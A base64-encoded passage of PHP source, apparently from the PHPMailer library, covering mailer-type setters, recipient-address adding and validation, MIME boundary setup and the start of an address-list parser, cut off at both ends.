nLCBIVE1MLXNhZmUgb3V0cHV0CiAgICAgICAgICAgICAgICBlY2hvIGh0bWxlbnRpdGllcygKICAgICAgICAgICAgICAgICAgICBwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkc3RyKSwKICAgICAgICAgICAgICAgICAgICBFTlRfUVVPVEVTLAogICAgICAgICAgICAgICAgICAgICdVVEYtOCcKICAgICAgICAgICAgICAgICksICI8YnI+XG4iOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2VjaG8nOgogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy9Ob3JtYWxpemUgbGluZSBicmVha3MKICAgICAgICAgICAgICAgICRzdHIgPSBwcmVnX3JlcGxhY2UoJy9cclxufFxyL20nLCAiXG4iLCAkc3RyKTsKICAgICAgICAgICAgICAgIGVjaG8gZ21kYXRlKCdZLW0tZCBIOmk6cycpLAogICAgICAgICAgICAgICAgIlx0IiwKICAgICAgICAgICAgICAgICAgICAvL1RyaW0gdHJhaWxpbmcgc3BhY2UKICAgICAgICAgICAgICAgIHRyaW0oCiAgICAgICAgICAgICAgICAgICAgLy9JbmRlbnQgZm9yIHJlYWRhYmlsaXR5LCBleGNlcHQgZm9yIHRyYWlsaW5nIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgc3RyX3JlcGxhY2UoCiAgICAgICAgICAgICAgICAgICAgICAgICJcbiIsCiAgICAgICAgICAgICAgICAgICAgICAgICJcbiAgICAgICAgICAgICAgICAgICBcdCAgICAgICAgICAgICAgICAgICIsCiAgICAgICAgICAgICAgICAgICAgICAgIHRyaW0oJHN0cikKICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICApLAogICAgICAgICAgICAgICAgIlxuIjsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXRzIG1lc3NhZ2UgdHlwZSB0byBIVE1MIG9yIHBsYWluLgogICAgICoKICAgICAqIEBwYXJhbSBib29sICRpc0h0bWwgVHJ1ZSBmb3IgSFRNTCBtb2RlCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpc0hUTUwoJGlzSHRtbCA9IHRydWUpCiAgICB7CiAgICAgICAgaWYgKCRpc0h0bWwpIHsKICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gc3RhdGljOjpDT05URU5UX1RZUEVfVEVYVF9IVE1MOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9IHN0YXRpYzo6Q09OVEVOVF9UWVBFX1BMQUlOVEVYVDsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIG1lc3NhZ2VzIHVzaW5nIFNNVFAuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpc1NNVFAoKQogICAgewogICAgICAgICR0aGlzLT5NYWlsZXIgPSAnc210cCc7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIG1lc3NhZ2VzIHVzaW5nIFBIUCdzIG1haWwoKSBmdW5jdGlvbi4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzTWFpbCgpCiAgICB7CiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdtYWlsJzsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgbWVzc2FnZXMgdXNpbmcgJFNlbmRtYWlsLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNTZW5kbWFpbCgpCiAgICB7CiAgICAgICAgJGluaV9zZW5kbWFpbF9wYXRoID0gaW5pX2dldCgnc2VuZG1haWxfcGF0aCcpOwoKICAgICAgICBpZiAoZmFsc2UgPT09IHN0cmlwb3MoJGluaV9zZW5kbWFpbF9wYXRoLCAnc2VuZG1haWwnKSkgewogICAgICAgICAgICAkdGhpcy0+U2VuZG1haWwgPSAnL3Vzci9zYmluL3NlbmRtYWlsJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+U2VuZG1haWwgPSAkaW5pX3NlbmRtYWlsX3BhdGg7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5NYWlsZXIgPSAnc2VuZG1haWwnOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtZXNzYWdlcyB1c2luZyBxbWFpbC4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzUW1haWwoKQogICAgewogICAgICAgICRpbmlfc2VuZG1haWxfcGF0aCA9IGluaV9nZXQoJ3NlbmRtYWlsX3BhdGgnKTsKCiAgICAgICAgaWYgKGZhbHNlID09PSBzdHJpcG9zKCRpbmlfc2VuZG1haWxfcGF0aCwgJ3FtYWlsJykpIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJy92YXIvcW1haWwvYmluL3FtYWlsLWluamVjdCc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJGluaV9zZW5kbWFpbF9wYXRoOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ3FtYWlsJzsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhICJUbyIgYWRkcmVzcy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQgdG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZEFkZHJlc3MoJGFkZHJlc3MsICRuYW1lID0gJycpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ3RvJywgJGFkZHJlc3MsICRuYW1lKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhICJDQyIgYWRkcmVzcy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQgdG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZENDKCRhZGRyZXNzLCAkbmFtZSA9ICcnKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCdjYycsICRhZGRyZXNzLCAkbmFtZSk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYSAiQkNDIiBhZGRyZXNzLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQkNDKCRhZGRyZXNzLCAkbmFtZSA9ICcnKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCdiY2MnLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgIlJlcGx5LVRvIiBhZGRyZXNzLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gcmVwbHkgdG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZFJlcGx5VG8oJGFkZHJlc3MsICRuYW1lID0gJycpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ1JlcGx5LVRvJywgJGFkZHJlc3MsICRuYW1lKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhbiBhZGRyZXNzIHRvIG9uZSBvZiB0aGUgcmVjaXBpZW50IGFycmF5cyBvciB0byB0aGUgUmVwbHlUbyBhcnJheS4gQmVjYXVzZSBQSFBNYWlsZXIKICAgICAqIGNhbid0IHZhbGlkYXRlIGFkZHJlc3NlcyB3aXRoIGFuIElETiB3aXRob3V0IGtub3dpbmcgdGhlIFBIUE1haWxlcjo6JENoYXJTZXQgKHRoYXQgY2FuIHN0aWxsCiAgICAgKiBiZSBtb2RpZmllZCBhZnRlciBjYWxsaW5nIHRoaXMgZnVuY3Rpb24pLCBhZGRpdGlvbiBvZiBzdWNoIGFkZHJlc3NlcyBpcyBkZWxheWVkIHVudGlsIHNlbmQoKS4KICAgICAqIEFkZHJlc3NlcyB0aGF0IGhhdmUgYmVlbiBhZGRlZCBhbHJlYWR5IHJldHVybiBmYWxzZSwgYnV0IGRvIG5vdCB0aHJvdyBleGNlcHRpb25zLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGtpbmQgICAgT25lIG9mICd0bycsICdjYycsICdiY2MnLCBvciAnUmVwbHktVG8nCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lICAgIEFuIG9wdGlvbmFsIHVzZXJuYW1lIGFzc29jaWF0ZWQgd2l0aCB0aGUgYWRkcmVzcwogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gYWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCRraW5kLCAkYWRkcmVzcywgJG5hbWUpCiAgICB7CiAgICAgICAgJHBvcyA9IGZhbHNlOwogICAgICAgIGlmICgkYWRkcmVzcyAhPT0gbnVsbCkgewogICAgICAgICAgICAkYWRkcmVzcyA9IHRyaW0oJGFkZHJlc3MpOwogICAgICAgICAgICAkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKTsKICAgICAgICB9CiAgICAgICAgaWYgKGZhbHNlID09PSAkcG9zKSB7CiAgICAgICAgICAgIC8vQXQtc2lnbiBpcyBtaXNzaW5nLgogICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAnJXMgKCVzKTogJXMnLAogICAgICAgICAgICAgICAgJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpLAogICAgICAgICAgICAgICAgJGtpbmQsCiAgICAgICAgICAgICAgICAkYWRkcmVzcwogICAgICAgICAgICApOwogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoJG5hbWUgIT09IG51bGwgJiYgaXNfc3RyaW5nKCRuYW1lKSkgewogICAgICAgICAgICAkbmFtZSA9IHRyaW0ocHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJG5hbWUpKTsgLy9TdHJpcCBicmVha3MgYW5kIHRyaW0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkbmFtZSA9ICcnOwogICAgICAgIH0KICAgICAgICAkcGFyYW1zID0gWyRraW5kLCAkYWRkcmVzcywgJG5hbWVdOwogICAgICAgIC8vRW5xdWV1ZSBhZGRyZXNzZXMgd2l0aCBJRE4gdW50aWwgd2Uga25vdyB0aGUgUEhQTWFpbGVyOjokQ2hhclNldC4KICAgICAgICAvL0RvbWFpbiBpcyBhc3N1bWVkIHRvIGJlIHdoYXRldmVyIGlzIGFmdGVyIHRoZSBsYXN0IEAgc3ltYm9sIGluIHRoZSBhZGRyZXNzCiAgICAgICAgaWYgKCR0aGlzLT5oYXM4Yml0Q2hhcnMoc3Vic3RyKCRhZGRyZXNzLCArKyRwb3MpKSkgewogICAgICAgICAgICBpZiAoc3RhdGljOjppZG5TdXBwb3J0ZWQoKSkgewogICAgICAgICAgICAgICAgaWYgKCdSZXBseS1UbycgIT09ICRraW5kKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKCRhZGRyZXNzLCAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlWyRhZGRyZXNzXSA9ICRwYXJhbXM7CgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoIWFycmF5X2tleV9leGlzdHMoJGFkZHJlc3MsICR0aGlzLT5SZXBseVRvUXVldWUpKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlJlcGx5VG9RdWV1ZVskYWRkcmVzc10gPSAkcGFyYW1zOwoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAvL1dlIGhhdmUgYW4gOC1iaXQgZG9tYWluLCBidXQgd2UgYXJlIG1pc3NpbmcgdGhlIG5lY2Vzc2FyeSBleHRlbnNpb25zIHRvIHN1cHBvcnQgaXQKICAgICAgICAgICAgLy9PciB3ZSBhcmUgYWxyZWFkeSBzZW5kaW5nIHRvIHRoaXMgYWRkcmVzcwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICAvL0ltbWVkaWF0ZWx5IGFkZCBzdGFuZGFyZCBhZGRyZXNzZXMgd2l0aG91dCBJRE4uCiAgICAgICAgcmV0dXJuIGNhbGxfdXNlcl9mdW5jX2FycmF5KFskdGhpcywgJ2FkZEFuQWRkcmVzcyddLCAkcGFyYW1zKTsKICAgIH0KCiAgICAvKioKICAgICAqIFNldCB0aGUgYm91bmRhcmllcyB0byB1c2UgZm9yIGRlbGltaXRpbmcgTUlNRSBwYXJ0cy4KICAgICAqIElmIHlvdSBvdmVycmlkZSB0aGlzLCBlbnN1cmUgeW91IHNldCBhbGwgMyBib3VuZGFyaWVzIHRvIHVuaXF1ZSB2YWx1ZXMuCiAgICAgKiBUaGUgZGVmYXVsdCBib3VuZGFyaWVzIGluY2x1ZGUgYSAiPV8iIHNlcXVlbmNlIHdoaWNoIGNhbm5vdCBvY2N1ciBpbiBxdW90ZWQtcHJpbnRhYmxlIGJvZGllcywKICAgICAqIGFzIHN1Z2dlc3RlZCBieSBodHRwczovL3d3dy5yZmMtZWRpdG9yLm9yZy9yZmMvcmZjMjA0NSNzZWN0aW9uLTYuNwogICAgICoKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0Qm91bmRhcmllcygpCiAgICB7CiAgICAgICAgJHRoaXMtPnVuaXF1ZWlkID0gJHRoaXMtPmdlbmVyYXRlSWQoKTsKICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMV0gPSAnYjE9XycgLiAkdGhpcy0+dW5pcXVlaWQ7CiAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzJdID0gJ2IyPV8nIC4gJHRoaXMtPnVuaXF1ZWlkOwogICAgICAgICR0aGlzLT5ib3VuZGFyeVszXSA9ICdiMz1fJyAuICR0aGlzLT51bmlxdWVpZDsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhbiBhZGRyZXNzIHRvIG9uZSBvZiB0aGUgcmVjaXBpZW50IGFycmF5cyBvciB0byB0aGUgUmVwbHlUbyBhcnJheS4KICAgICAqIEFkZHJlc3NlcyB0aGF0IGhhdmUgYmVlbiBhZGRlZCBhbHJlYWR5IHJldHVybiBmYWxzZSwgYnV0IGRvIG5vdCB0aHJvdyBleGNlcHRpb25zLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGtpbmQgICAgT25lIG9mICd0bycsICdjYycsICdiY2MnLCBvciAnUmVwbHlUbycKICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCwgcmVzcC4gdG8gcmVwbHkgdG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGFkZEFuQWRkcmVzcygka2luZCwgJGFkZHJlc3MsICRuYW1lID0gJycpCiAgICB7CiAgICAgICAgaWYgKAogICAgICAgICAgICBzZWxmOjokdmFsaWRhdG9yID09PSAncGhwJyAmJgogICAgICAgICAgICAoKGJvb2wpIHByZWdfbWF0Y2goJy9bXHg4MC1ceEZGXS8nLCAkYWRkcmVzcykpCiAgICAgICAgKSB7CiAgICAgICAgICAgIC8vVGhlIGNhbGxlciBoYXMgbm90IGFsdGVyZWQgdGhlIHZhbGlkYXRvciBhbmQgaXMgc2VuZGluZyB0byBhbiBhZGRyZXNzCiAgICAgICAgICAgIC8vd2l0aCBVVEYtOCwgc28gYXNzdW1lIHRoYXQgdGhleSB3YW50IFVURi04IHN1cHBvcnQgaW5zdGVhZCBvZiBmYWlsaW5nCiAgICAgICAgICAgICR0aGlzLT5DaGFyU2V0ID0gc2VsZjo6Q0hBUlNFVF9VVEY4OwogICAgICAgICAgICBzZWxmOjokdmFsaWRhdG9yID0gJ2VhaSc7CiAgICAgICAgfQogICAgICAgIGlmICghaW5fYXJyYXkoJGtpbmQsIFsndG8nLCAnY2MnLCAnYmNjJywgJ1JlcGx5LVRvJ10pKSB7CiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gc3ByaW50ZigKICAgICAgICAgICAgICAgICclczogJXMnLAogICAgICAgICAgICAgICAgJHRoaXMtPmxhbmcoJ0ludmFsaWQgcmVjaXBpZW50IGtpbmQnKSwKICAgICAgICAgICAgICAgICRraW5kCiAgICAgICAgICAgICk7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIGlmICghc3RhdGljOjp2YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7CiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gc3ByaW50ZigKICAgICAgICAgICAgICAgICclcyAoJXMpOiAlcycsCiAgICAgICAgICAgICAgICAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJyksCiAgICAgICAgICAgICAgICAka2luZCwKICAgICAgICAgICAgICAgICRhZGRyZXNzCiAgICAgICAgICAgICk7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIGlmICgnUmVwbHktVG8nICE9PSAka2luZCkgewogICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoc3RydG9sb3dlcigkYWRkcmVzcyksICR0aGlzLT5hbGxfcmVjaXBpZW50cykpIHsKICAgICAgICAgICAgICAgICR0aGlzLT57JGtpbmR9W10gPSBbJGFkZHJlc3MsICRuYW1lXTsKICAgICAgICAgICAgICAgICR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCRhZGRyZXNzKV0gPSB0cnVlOwoKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlaWYgKCFhcnJheV9rZXlfZXhpc3RzKHN0cnRvbG93ZXIoJGFkZHJlc3MpLCAkdGhpcy0+UmVwbHlUbykpIHsKICAgICAgICAgICAgJHRoaXMtPlJlcGx5VG9bc3RydG9sb3dlcigkYWRkcmVzcyldID0gWyRhZGRyZXNzLCAkbmFtZV07CgogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CgogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIFBhcnNlIGFuZCB2YWxpZGF0ZSBhIHN0cmluZyBjb250YWluaW5nIG9uZSBvciBtb3JlIFJGQzgyMi1zdHlsZSBjb21tYS1zZXBhcmF0ZWQgZW1haWwgYWRkcmVzc2VzCiAgICAgKiBvZiB0aGUgZm9ybSAiZGlzcGxheSBuYW1lIDxhZGRyZXNzPiIgaW50byBhbiBhcnJheSBvZiBuYW1lL2FkZHJlc3MgcGFpcnMuCiAgICAgKiBVc2VzIHRoZSBpbWFwX3JmYzgyMl9wYXJzZV9hZHJsaXN0IGZ1bmN0aW9uIGlmIHRoZSBJTUFQIGV4dGVuc2lvbiBpcyBhdmFpbGFibGUuCiAgICAgKiBOb3RlIHRoYXQgcXVvdGVzIGluIHRoZSBuYW1lIHBhcnQgYXJlIHJlbW92ZWQuCiAgICAgKgogICAgICogQHNlZSBodHRwczovL3d3dy5hbmRyZXcuY211LmVkdS91c2VyL2FncmVlbjEvdGVzdGluZy9tcmJzL3dlYi9NYWlsL1JGQzgyMi5waHAgQSBtb3JlIGNhcmVmdWwgaW1wbGVtZW50YXRpb24KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyc3RyIFRoZSBhZGRyZXNzIGxpc3Qgc3RyaW5nCiAgICAgKiBAcGFyYW0gYm9vbCAgICR1c2VpbWFwIFdoZXRoZXIgdG8gdXNlIHRoZSBJTUFQIGV4dGVuc2lvbiB0byBwYXJzZSB0aGUgbGlzdAogICAgICogQHBhcmFtIHN0cmluZyAkY2hhcnNldCBUaGUgY2hhcnNldCB0byB1c2Ugd2hlbiBkZWNvZGluZyB0aGUgYWRkcmVzcyBsaXN0IHN0cmluZy4KICAgICAqCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gcGFyc2VBZGRyZXNzZXMoJGFkZHJzdHIsICR1c2VpbWFwID0gdHJ1ZSwgJGNoYXJzZXQgPSBzZWxmOjpDSEFSU0VUX0lTTzg4NTkxKQogICAgewogICAgICAgICRhZGRyZXNzZXMgPSBbXTsKICAgICAgICBpZiAoJHVzZWltYXAgJiYgZnVuY3Rpb25fZXhpc3RzKCdpbWFwX3JmYzgyMl9wYXJzZV9hZHJsaXN0JykpIHsKICAgICAgICAgICAgLy9Vc2UgdGhpcyBidWlsdC1pbiBwYXJzZXIgaWYgaXQncyBhdmFpbGFibGUKICAgICAgICAgICAgJGxpc3QgPSBpbWFwX3JmYzgyMl9wYXJzZV9hZHJsaXN0KCRhZGRyc3RyLCAnJyk7CiAgICAgICAgICAgIC8vIENsZWFyIGFueSBwb3RlbnRpYWwgSU1BUCBlcnJvcnMgdG8gZ2V0IHJpZCBvZiBub3RpY2VzIGJlaW5nIHRocm93biBhdCBlbmQgb2Ygc2NyaXB0LgogICAgICAgICAgICBpbWFwX2Vycm9ycygpOwogICAgICAgICAgICBmb3JlYWNoICgkbGlzdCBhcyAkYWRkcmVzcykgewogICAgICAgICAgICAgICAgaWYgKAogICAgICAgICAgICAgICAgICAgICcuU1lOVEFYLUVSUk9SLicgIT09ICRhZGRyZXNzLT5ob3N0ICYmCiAgICAgICAgICAgICAgICAgICAgc3RhdGljOjp2YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MtPm1haWxib3ggLiAnQCcgLiAkYWRkcmVzcy0+aG9zdCkKICAgICAgICAgICAgICAgICkgewogICAgICAgICAgICAgICAgICAgIC8vRGVjb2RlIHRoZSBuYW1lIHBhcnQgaWYgaXQncyBwcmVzZW50IGFuZCBlbmNvZGVkCiAgICAgICAgICAgICAgICAgICAgaWYgKAogICAgICAgICAgICAgICAgICAgICAgICBwcm9wZXJ0eV9leGlzdHMoJGFkZHJlc3MsICdwZXJzb25hbCcpICYmCiAgICAgICAgICAgICAgICAgICAgICAgIC8vQ2hlY2sgZm9yIGEgTWJzdHJpbmcgY29uc3RhbnQgcmF0aGVyIHRoYW4gdXNpbmcgZXh0ZW5zaW9uX2xvYWRlZCwgd2hpY2ggaXMgc29tZXRpbWVzIGRpc2FibGVkCiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmluZWQoJ01CX0NBU0VfVVBQRVInKSAmJgogICAgICAgICAgICAgICAgICAgICAgICBwcmVnX21hdGNoKCcvXj1cPy4qXD89JC9zJywgJGFkZHJlc3MtPnBlcnNvbmFsKQogICAgICAgICAgICAgICAgICAgICkgewogICAgICAgICAgICAgICAgICAgICAgICAkb3JpZ0NoYXJzZXQgPSBtYl9pbnRlcm5hbF9lbmNvZGluZygpOwogICAgICAgICAgICAgICAgICAgICAgICBtYl9pbnRlcm5hbF9lbmNvZGluZygkY2hhcnNldCk7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vVW5kbyBhbnkgUkZDMjA0Ny1lbmNvZGVkIHNwYWNlcy1hcy11bmRlcnNjb3JlcwogICAgICAgICAgICAgICAgICAgICAgICAkYWRkcmVzcy0+cGVyc29uYWwgPSBzdHJfcmVwbGFjZSgnXycsICc9MjAnLCAkYWRkcmVzcy0+cGVyc29uYWwpOwogICAgICAgICAgICAgICAgICAgICAgICAvL0RlY29kZSB0aGUgbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkYWRkcmVzcy0+cGVyc29uYWwgPSBtYl9kZWNvZGVfbWltZWhlYWRlcigkYWRkcmVzcy0+cGVyc29uYWwpOwogICAgICAgICAgICAgICAgICAgICAgICBtYl9pbnRlcm5hbF9lbmNvZGluZygkb3JpZ0NoYXJzZXQpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gWwogICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gKHByb3BlcnR5X2V4aXN0cygkYWRkcmVzcywgJ3BlcnNvbmFsJykgPyAkYWRkcmVzcy0+cGVyc29uYWwgOiAnJyksCiAgICAgICAgICAgICAgICAgICAgICAgICdhZGRyZXNzJyA9PiAkYWRkcmVzcy0+bWFpbGJveCAuICdAJyAuICRhZGRyZXNzLT5ob3N0LAogICAgICAgICAgICAgICAgICAgIF07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvL1VzZSB0aGlzIHNpbXBsZXIgcGFyc2VyCiAgICAgICAgICAgICRsaXN0ID0gZXhwbG9kZSgnLCcsICRhZGRyc3RyKTsKICAgICAgICAgICAgZm9yZWFjaCAoJGxpc3QgYXMgJGFkZHJlc3MpIHsKICAgICAgICAgICAgICAgICRhZGRyZXNzID0gdHJpbSgkYWRkcmVzcyk7CiAgICAgICAgICAgICAgICAvL0lzIHRoZXJlIGEgc2VwYXJhdGUgbmFtZSBwYXJ0PwogICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkYWRkcmVzcywgJzwnKSA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICAgICAvL05vIHNlcGFyYXRlIG5hbWUsIGp1c3QgdXNlIHRoZSB3